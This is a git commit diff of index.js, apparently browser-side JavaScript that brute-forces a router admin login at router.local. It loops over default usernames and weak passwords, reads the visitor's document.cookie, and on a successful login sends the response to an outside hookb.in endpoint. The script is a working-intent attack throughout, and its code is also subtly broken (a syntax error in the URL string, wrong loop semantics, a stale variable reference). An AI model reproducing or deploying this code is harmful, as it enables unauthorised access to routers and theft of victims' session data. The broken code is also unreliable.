105ff594b8ff512f82d875f3d75dee93de947d5c
nastassiagoodson <60201494+nastassiagoodson@users.noreply.github.com>
2022-03-07 11:08:20 -0800

    Update index.js

--- index.js
+++ index.js
@@ -1,6 +1,6 @@
 //figure out how to login more automatically (e.g. for loops with all usernames/passwords + sending requests with each of them
 
-const http = new XMLHttpRequest();
+//const http = new XMLHttpRequest();
 //http.open('POST', 'http://router.local/login.php', true);
 //'http://router.local/home.php?action=view&'+cook -> what we http.responseURL if successful login
 //http://router.local/view.php
@@ -22,21 +22,23 @@ const cook = document.cookie;
 //http.send(cook+"&username=admin&pin=password&notRobot=on");
 const unames = ["admin","root","cisco"];
 const pwords = ["123456","admin","password","secured"];
+var requests=new Array(unames.length * pwords.length);
+var i = 0;
 for (u in unames) {
   for (p in pwords) {
+    requests[i] = new XMLHttpRequest();
     var url = cook+"&username="u+"&pin="+p+"&notRobot=on";
-    http.open('POST', 'http://router.local/login.php', true);
-    http.onload = function () {
-      if(http.readyState === XMLHttpRequest.DONE && http.status === 200) {
-        if (http.responseURL === 'http://router.local/home.php?action=view&'+cook) {
+    requests[i].open('POST', 'http://router.local/login.php', true);
+    requests[i].onload = function () {
+        if (requests[i].responseURL === 'http://router.local/home.php?action=view&'+cook) {
                 const xhr = new XMLHttpRequest();
                 xhr.open('POST', 'https://hookb.in/NOrwgEmDKjte8mNNl6Nd', true);
                 xhr.setRequestHeader('Content-type', 'application/json');
                 xhr.send(JSON.stringify(http.response));
         }
-      }
     };
-    http.send(url)
+    requests[i].send(url)
+    i = i + 1
   }
 }
 
